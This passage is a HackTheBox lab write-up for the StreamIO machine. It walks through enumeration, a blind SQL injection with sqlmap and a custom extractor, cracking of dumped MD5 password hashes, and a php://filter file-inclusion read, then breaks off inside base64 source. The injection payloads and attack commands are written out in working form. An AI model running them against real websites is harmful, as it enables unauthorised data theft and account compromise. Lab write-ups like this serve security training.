---
title: "HackTheBox - StreamIO"
published: true
---

| Field            | Details                                                                                                                                                                                                    |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OS**           | Windows                                                                                                                                                                                                    |
| **Difficulty**   | Medium                                                                                                                                                                                                     |
| **Release Date** | 2022-06-04                                                                                                                                                                                                 |
| **Pwned Date**   | 2026-07-25                                                                                                                                                                                                 |
| **Tags**         | `web enumeration` `ffuf` `arjun` `sqlmap` `blind sqli` `microsoft sql server` `hashcat` `file inclusion` `php` `sqlcmd` `firefox credentials` `logins.json` `firepwd` `hydra` `ms-Mcs-AdmPwd` `WriteOwner` |

## Summary

StreamIO is a medium machine where subdomain enumeration leads to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we enumerate databases and obtain further credentials used in lateral movement. As the secondary user we enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials enumerating AD we discover that the user has the ability to add themselves to a specific group in which they can read the administrator LAPS password via the ms-Mcs-AdmPwd property. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the Core Staff group, then use this access to disclose the administrator LAPS password.

## Reconnaissance

### Port scan

Start with port scanning

```bash
python portscan.py --target <TARGET_IP>
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/portscan.py). If you want to run standard commands run

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
nmap -sC -sV -p 53,80,88,135,139,389,443,445,464,593,636,3268,5985,9389,49667,49677,49678,49709 -oN service_scan.txt <TARGET_IP>
```

In any case the output should look like this

```bash
--- Detected ports ---
port: 53; protocol: tcp; state: open
port: 80; protocol: tcp; state: open
port: 88; protocol: tcp; state: open
port: 135; protocol: tcp; state: open
port: 139; protocol: tcp; state: open
port: 389; protocol: tcp; state: open
port: 443; protocol: tcp; state: open
port: 445; protocol: tcp; state: open
port: 464; protocol: tcp; state: open
port: 593; protocol: tcp; state: open
port: 636; protocol: tcp; state: open
port: 3268; protocol: tcp; state: open
port: 5985; protocol: tcp; state: open
port: 9389; protocol: tcp; state: open
port: 49667; protocol: tcp; state: open
port: 49677; protocol: tcp; state: open
port: 49678; protocol: tcp; state: open
port: 49709; protocol: tcp; state: open

--- Detected services ---
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-20 16:57 EDT
Nmap scan report for 10.129.33.150
Host is up (0.028s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-21 03:57:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2026-07-21T03:58:50+00:00; +6h59m56s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-21T03:58:13
|_  start_date: N/A
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m55s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.89 seconds
```

### HTTP enumeration

Notice the line **Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb** from port 443 scan and add both domains to your /etc/hosts file

```bash
<TARGET_IP> streamIO.htb watch.streamIO.htb
```

Now you should be able to browse to both https://streamIO.htb and https://watch.streamIO.htb

Run subdirectory enumeration

```bash
python webenum.py -t https://streamio.htb/ --web
```

This is a [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/webenum.py). If you want to run standard commands refer to the ffuf commands in the output below

```bash
[*] Target : https://streamio.htb
[*] Mode : web
[*] Size   : web=small api=small vhost=small
[*] Output : ./subdirenum_20260725_094140


############################################################
#                    ENUMERATING: BASE                     #
############################################################

[*] Checking common files...
[*] Extension hint: 'x-powered-by: asp.net' → ['.asp', '.aspx']
[*] Extension hint: 'set-cookie: phpsessid=g9sv9nm3kselb30f6hr1c0cdnc; path=/' → ['.php']
[+] Extensions to fuzz: ['.asp', '.aspx', '.php']
[*] Running ffuf cmd  →  ffuf -u https://streamio.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_094140/base/web_dirb_common.csv -of csv -s -e .asp,.aspx,.php
[*] Running ffuf cmd  →  ffuf -u https://streamio.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_094140/base/web_raft_small.csv -of csv -s -e .asp,.aspx,.php

############################################################
#                         SUMMARY                          #
############################################################

[+] 200  https://streamio.htb/
[+] 200  https://streamio.htb/.
[+] 200  https://streamio.htb/about.php
[+] 200  https://streamio.htb/contact.php
[+] 200  https://streamio.htb/favicon.ico
[+] 200  https://streamio.htb/index.php
[+] 200  https://streamio.htb/login.php
[+] 200  https://streamio.htb/register.php
[+] 301  https://streamio.htb/admin
[+] 301  https://streamio.htb/css
[+] 301  https://streamio.htb/fonts
[+] 301  https://streamio.htb/images
[+] 301  https://streamio.htb/js
[+] 302  https://streamio.htb/logout.php

[+] Summary saved to ./subdirenum_20260725_094140/base/summary.txt  (14 unique paths)
```

The enumeration discovered a **https://streamio.htb/admin** route.

Unfortunately, it requires authentication and it's not accessible for now.

Run enumeration against it to check if it has accessible subpages.

```bash
python webenum.py -t https://streamio.htb/admin --web --extensions php

[*] Target : https://streamio.htb/admin
[*] Mode : web
[*] Size   : web=small api=small vhost=small
[*] Output : ./subdirenum_20260725_095335


############################################################
#                    ENUMERATING: BASE                     #
############################################################

[*] Checking common files...
[!] Could not scrape index for extensions: HTTP Error 403: Forbidden
[!] Could not detect extensions: HTTP Error 403: Forbidden
[*] Manual extensions added: {'.php'}
[+] Extensions to fuzz: ['.php']
[*] Running ffuf cmd  →  ffuf -u https://streamio.htb/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_095335/base/web_dirb_common.csv -of csv -s -e .php
[*] Running ffuf cmd  →  ffuf -u https://streamio.htb/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_095335/base/web_raft_small.csv -of csv -s -e .php

############################################################
#                         SUMMARY                          #
############################################################

[+] 200  https://streamio.htb/admin/master.php
[+] 301  https://streamio.htb/admin/css
[+] 301  https://streamio.htb/admin/fonts
[+] 301  https://streamio.htb/admin/images
[+] 301  https://streamio.htb/admin/js
[+] 403  https://streamio.htb/admin/
[+] 403  https://streamio.htb/admin/.
[+] 403  https://streamio.htb/admin/index.php

[+] Summary saved to ./subdirenum_20260725_095335/base/summary.txt  (8 unique paths)
```

A **master.php** was discovered, if you browse to it, it shows the following text

```
Movie managment
Only accessable through includes
```

This suggests this page is supposed to be included in another page somehow.

Continue enumeration with the watch.streamio.htb subdomain

```bash
python webenum.py -t https://watch.streamio.htb --web --extensions php,asp,aspx

[*] Target : https://watch.streamio.htb
[*] Mode : web
[*] Size   : web=small api=small vhost=small
[*] Output : ./subdirenum_20260725_100400


############################################################
#                    ENUMERATING: BASE                     #
############################################################

[*] Checking common files...
[*] Extension hint: 'x-powered-by: asp.net' → ['.asp', '.aspx']
[*] Manual extensions added: {'.asp', '.php', '.aspx'}
[+] Extensions to fuzz: ['.asp', '.aspx', '.php']
[*] Running ffuf cmd  →  ffuf -u https://watch.streamio.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_100400/base/web_dirb_common.csv -of csv -s -e .asp,.aspx,.php
[*] Running ffuf cmd  →  ffuf -u https://watch.streamio.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_100400/base/web_raft_small.csv -of csv -s -e .asp,.aspx,.php

############################################################
#                         SUMMARY                          #
############################################################

[+] 200  https://watch.streamio.htb/
[+] 200  https://watch.streamio.htb/.
[+] 200  https://watch.streamio.htb/blocked.php
[+] 200  https://watch.streamio.htb/favicon.ico
[+] 200  https://watch.streamio.htb/index.php
[+] 200  https://watch.streamio.htb/search.php
[+] 301  https://watch.streamio.htb/static

[+] Summary saved to ./subdirenum_20260725_100400/base/summary.txt  (7 unique paths)
```

Found a **search.php** page, which provides a search feature for movies.

### SQL injection

Upon clicking the 'Search' button a POST request with a "q=<SEARCH_TEXT>" data is sent to the server

Test the field for sql injection

```bash
sqlmap -u "https://watch.streamio.htb/search.php" \
  --data="q=toy" \
  --method POST \
  --batch \
  --level 3 \
  --risk 2
```

Notice that 'toy' is a successful search query that returns the movie entry for 'Toy Story 3'.

You should find the following in the output

```bash
[snip]
POST parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 183 HTTP(s) requests:
---
Parameter: q (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=toy%' AND 8348=8348 AND 'VKVE%'='VKVE
---
[snip]
```

### Db enumeration with boolean-based blind injection

Boolean-based blind injections allow you to know whether a query is true or false based on the received response. You cannot get directly the data from the db but based on the true/false response it's possible to guess the chars one by one and thus extract the data.

Assume you want to know the db name. What you do is basically this:

- Is 'a' the first char of the db name? If false, keep going
- Is 'b' the first char of the db name? If false, keep going
- Is 'c' the first char of the db name? If false, keep going
- ...

and based on the true/false responses you determine if you guessed the correct char. When you get 'true' you move to the next char and you keep going until you guess all chars.

This is unfeasible manually (would probably require days) so you can use the following [custom tool](https://github.com/n-califano/sectools/blob/main/tools/common/blind_sql_extractor.py) (or any other you like).

Find db name

```bash
python blind_sql_extractor.py -q "DB_NAME()" -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy
DB_NAME(): STREAMIO
```

The script is very slow but does its job. Run it with the '-h' flag to understand the arguments.

Found a db named **STREAMIO**, enumerate its tables

```bash
python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-tables
Found table: movies
Found table: users

All tables: ['movies', 'users']
```

Focus on 'users' table, extract its columns

```bash
python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --enum-columns -t users
Found column: id
Found column: username
Found column: password
Found column: is_staff

Columns for table users: ['id', 'username', 'password', 'is_staff']
```

Knowing the columns you can dump the table.

Warning: the next command will be **very slow**, like "a couple of hours" slow. Go watch a movie or something.

```bash
python blind_sql_extractor.py -u "https://watch.streamio.htb/search.php" -pt "toy%' AND ASCII(SUBSTRING(({}),{},1))={} AND 'vdVq%'='vdVq" -p q --true-string Toy --dump-table -t users -c id,username,password,is_staff
Found 30 rows in users
Column id: int
Column username: nchar
Column password: nchar
Column is_staff: bit
Row 1: {'id': '3', 'username': 'James', 'password': 'c660060492d9edcaa8332d89c99c9239', 'is_staff': '1'}
Row 2: {'id': '4', 'username': 'Theodore', 'password': '925e5408ecb67aea449373d668b7359e', 'is_staff': '1'}
Row 3: {'id': '5', 'username': 'Samantha', 'password': '083ffae904143c4796e464dac33c1f7d', 'is_staff': '1'}
Row 4: {'id': '6', 'username': 'Lauren', 'password': '08344b85b329d7efd611b7a7743e8a09', 'is_staff': '1'}
Row 5: {'id': '7', 'username': 'William', 'password': 'd62be0dc82071bccc1322d64ec5b6c51', 'is_staff': '1'}
Row 6: {'id': '8', 'username': 'Sabrina', 'password': 'f87d3c0d6c8fd686aacc6627f1f493a5', 'is_staff': '1'}
Row 7: {'id': '9', 'username': 'Robert', 'password': 'f03b910e2bd0313a23fdd7575f34a694', 'is_staff': '1'}
Row 8: {'id': '10', 'username': 'Thane', 'password': '3577c47eb1e12c8ba021611e1280753c', 'is_staff': '1'}
Row 9: {'id': '11', 'username': 'Carmon', 'password': '35394484d89fcfdb3c5e447fe749d213', 'is_staff': '1'}
Row 10: {'id': '12', 'username': 'Barry', 'password': '54c88b2dbd7b1a84012fabc1a4c73415', 'is_staff': '1'}
Row 11: {'id': '13', 'username': 'Oliver', 'password': 'fd78db29173a5cf701bd69027cb9bf6b', 'is_staff': '1'}
Row 12: {'id': '14', 'username': 'Michelle', 'password': 'b83439b16f844bd6ffe35c02fe21b3c0', 'is_staff': '1'}
Row 13: {'id': '15', 'username': 'Gloria', 'password': '0cfaaaafb559f081df2befbe66686de0', 'is_staff': '1'}
Row 14: {'id': '16', 'username': 'Victoria', 'password': 'b22abb47a02b52d5dfa27fb0b534f693', 'is_staff': '1'}
Row 15: {'id': '17', 'username': 'Alexendra', 'password': '1c2b3d8270321140e5153f6637d3ee53', 'is_staff': '1'}
Row 16: {'id': '18', 'username': 'Baxter', 'password': '22ee218331afd081b0dcd8115284bae3', 'is_staff': '1'}
Row 17: {'id': '19', 'username': 'Clara', 'password': 'ef8f3d30a856cf166fb8215aca93e9ff', 'is_staff': '1'}
Row 18: {'id': '20', 'username': 'Barbra', 'password': '3961548825e3e21df5646cafe11c6c76', 'is_staff': '1'}
Row 19: {'id': '21', 'username': 'Lenord', 'password': 'ee0b8a0937abd60c2882eacb2f8dc49f', 'is_staff': '1'}
Row 20: {'id': '22', 'username': 'Austin', 'password': '0049ac57646627b8d7aeaccf8b6a936f', 'is_staff': '1'}
Row 21: {'id': '23', 'username': 'Garfield', 'password': '8097cedd612cc37c29db152b6e9edbd3', 'is_staff': '1'}
Row 22: {'id': '24', 'username': 'Juliette', 'password': '6dcd87740abb64edfa36d170f0d5450d', 'is_staff': '1'}
Row 23: {'id': '25', 'username': 'Victor', 'password': 'bf55e15b119860a6e6b5a164377da719', 'is_staff': '1'}
Row 24: {'id': '26', 'username': 'Lucifer', 'password': '7df45a9e3de3863807c026ba48e55fb3', 'is_staff': '1'}
Row 25: {'id': '27', 'username': 'Bruno', 'password': '2a4e2cf22dd8fcb45adcb91be1e22ae8', 'is_staff': '1'}
Row 26: {'id': '28', 'username': 'Diablo', 'password': 'ec33265e5fc8c2f1b0c137bb7b3632b5', 'is_staff': '1'}
Row 27: {'id': '29', 'username': 'Robin', 'password': 'dc332fb5576e9631c9dae83f194f8e70', 'is_staff': '1'}
Row 28: {'id': '30', 'username': 'Stan', 'password': '384463526d288edcc95fc3701e523bc7', 'is_staff': '1'}
Row 29: {'id': '31', 'username': 'yoshihide', 'password': 'b779ba15cedfd22a023c4d8bcf5f2332', 'is_staff': '1'}
Row 30: {'id': '33', 'username': 'admin', 'password': '665a50ac9eaa781e4f7f04199db97a11', 'is_staff': '0'}
```

### Hash cracking

All the discovered passwords are md5 hashes. Put them in a 'hashes.txt' file, one hash per line.

```bash
cat hashes.txt
c660060492d9edcaa8332d89c99c9239
925e5408ecb67aea449373d668b7359e
083ffae904143c4796e464dac33c1f7d
08344b85b329d7efd611b7a7743e8a09
d62be0dc82071bccc1322d64ec5b6c51
f87d3c0d6c8fd686aacc6627f1f493a5
f03b910e2bd0313a23fdd7575f34a694
3577c47eb1e12c8ba021611e1280753c
35394484d89fcfdb3c5e447fe749d213
54c88b2dbd7b1a84012fabc1a4c73415
fd78db29173a5cf701bd69027cb9bf6b
b83439b16f844bd6ffe35c02fe21b3c0
0cfaaaafb559f081df2befbe66686de0
b22abb47a02b52d5dfa27fb0b534f693
1c2b3d8270321140e5153f6637d3ee53
22ee218331afd081b0dcd8115284bae3
ef8f3d30a856cf166fb8215aca93e9ff
3961548825e3e21df5646cafe11c6c76
ee0b8a0937abd60c2882eacb2f8dc49f
0049ac57646627b8d7aeaccf8b6a936f
8097cedd612cc37c29db152b6e9edbd3
6dcd87740abb64edfa36d170f0d5450d
bf55e15b119860a6e6b5a164377da719
7df45a9e3de3863807c026ba48e55fb3
2a4e2cf22dd8fcb45adcb91be1e22ae8
ec33265e5fc8c2f1b0c137bb7b3632b5
dc332fb5576e9631c9dae83f194f8e70
384463526d288edcc95fc3701e523bc7
b779ba15cedfd22a023c4d8bcf5f2332
665a50ac9eaa781e4f7f04199db97a11
```

Run hashcat to attempt cracking.

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt.gz
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2915/5894 MB (1024 MB allocatable), 6MCU

[snip]

3577c47eb1e12c8ba021611e1280753c:highschoolmusical
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
665a50ac9eaa781e4f7f04199db97a11:paddpadd
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
ef8f3d30a856cf166fb8215aca93e9ff:%$clara
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
6dcd87740abb64edfa36d170f0d5450d:$3xybitch
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Thu Jul 23 09:05:29 2026 (5 secs)
Time.Estimated...: Thu Jul 23 09:05:34 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2894.8 kH/s (0.18ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 12/30 (40.00%) Digests (total), 12/30 (40.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[212173657879616e67656c2121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 34%

Started: Thu Jul 23 09:05:25 2026
Stopped: Thu Jul 23 09:05:36 2026
```

### /admin route enumeration

Hashcat managed to discover several passwords.

Use yoshihide's credentials (66boysandgirls..) to login to the webapp (on the login.php page).

Once logged in you can browse to the previously forbidden /admin route.

The page features four tabs, clicking on each tab shows different content on the page and changes the url in https://streamio.htb/admin/?<PAGE_NAME>

Example: clicking on 'Movie management' -> https://streamio.htb/admin/?movie

Brute-forcing of that <PAGE_NAME> parameter can be attempted to check if there are hidden pages beside the four provided by the tabs.

Re-run enumeration on the /admin route. Make sure to pass your cookie, since the route requires authentication (you can get it in the Network tab of your browser).

Warning: the cookie expires after a while, so you may need to login again if too much time has passed after the last login.

```bash
python webenum.py -t https://streamio.htb/admin --web --extensions php,asp,aspx --headers "Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c" --param-discovery
[*] Target : https://streamio.htb/admin
[*] Mode : web param-discovery
[*] Size   : web=small api=small vhost=small
[*] Output : ./subdirenum_20260725_184037


############################################################
#                    ENUMERATING: BASE                     #
############################################################

[*] Checking common files...
[!] Could not scrape index for extensions: HTTP Error 403: Forbidden
[!] Could not detect extensions: HTTP Error 403: Forbidden
[*] Manual extensions added: {'.php', '.aspx', '.asp'}
[+] Extensions to fuzz: ['.asp', '.aspx', '.php']
[*] Running ffuf cmd  →  ffuf -u https://streamio.htb/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_184037/base/web_dirb_common.csv -of csv -s -e .asp,.aspx,.php
[*] Running ffuf cmd  →  ffuf -u https://streamio.htb/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,201,204,301,302,307,401,403,405,500 -o ./subdirenum_20260725_184037/base/web_raft_small.csv -of csv -s -e .asp,.aspx,.php
[*] Running arjun cmd  →  arjun -u https://streamio.htb/admin/index.php -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -oT ./subdirenum_20260725_184037/base/params_index.php.txt -c 5 --headers Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c
[*] Running arjun cmd  →  arjun -u https://streamio.htb/admin/master.php -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -oT ./subdirenum_20260725_184037/base/params_master.php.txt -c 5 --headers Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c

############################################################
#                         SUMMARY                          #
############################################################

[+] 200  https://streamio.htb/admin/master.php
[+] 301  https://streamio.htb/admin/css
[+] 301  https://streamio.htb/admin/fonts
[+] 301  https://streamio.htb/admin/images
[+] 301  https://streamio.htb/admin/js
[+] 403  https://streamio.htb/admin/
[+] 403  https://streamio.htb/admin/.
[+] 403  https://streamio.htb/admin/index.php

[+]  Parameters found: user, movie, staff, debug in https://streamio.htb/admin/index.php

[+] Summary saved to ./subdirenum_20260725_184037/base/summary.txt  (8 unique paths)
```

Notice the "Parameters found:" line. The discovered **debug** parameter is not tied to any tab.

Browsing to https://streamio.htb/admin/?debug it shows a page with the following text:

```
this option is for developers only
```

Remember the master.php page found earlier, with the message 'only accessible via includes'

If you browse to https://streamio.htb/admin/?debug=master.php passing the file name to the debug parameter you will be able to see the actual page

The master.php page shows the content of all other tabs in a single view.

If you read the source code and scroll until the end you will find this element

```php
<form method="POST">
<input name="include" hidden>
</form>
```

It would be interesting to see the php source of this element.

That can be achieved with the following command

```bash
curl -k "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php" -H "Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c"
```

This will print the source code of the master.php page encoded in base64

```php
             <div id="inc">
                        this option is for developers only
                        PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KC